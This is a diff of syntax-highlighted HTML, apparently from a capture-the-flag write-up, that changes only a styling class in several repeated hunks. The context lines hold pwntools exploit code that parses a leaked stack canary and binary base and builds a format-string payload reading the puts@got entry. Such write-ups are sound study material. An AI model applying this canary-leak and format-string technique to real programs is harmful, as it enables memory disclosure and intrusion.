@@ -333,8 +333,8 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?
 
 leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
 
-canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
+canary</span><span class="o"> =</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
 
 log.info(</span><span class="no">f</span><span class="s">"Canary: </span><span class="p">{</span><span class="no">hex</span><span class="p">(canary)}</span><span class="s">"</span><span class="p">)
 log.info(</span><span class="no">f</span><span class="s">"Binary base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)
@@ -450,8 +450,8 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?
 
 leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
 
-canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
+canary</span><span class="o"> =</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
 
 payload </span><span class="o">= </span><span class="no">b</span><span class="s">"%9$s...." </span><span class="o">+ </span><span class="p">p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x3f90</span><span class="p">) </span><span class="c1"># puts@got</span><span class="p">
 
@@ -508,8 +508,8 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?
 
 leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
 
-canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
+canary</span><span class="o"> =</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
 
 payload </span><span class="o">= </span><span class="no">b</span><span class="s">"%9$s...." </span><span class="o">+ </span><span class="p">p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x3f90</span><span class="p">) </span><span class="c1"># puts@got</span><span class="p">
 
@@ -563,8 +563,8 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?
 
 leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
 
-canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
+canary</span><span class="o"> =</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
 
 payload </span><span class="o">= </span><span class="no">b</span><span class="s">"%9$s...." </span><span class="o">+ </span><span class="p">p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x3f90</span><span class="p">) </span><span class="c1"># puts@got</span><span class="p">
 
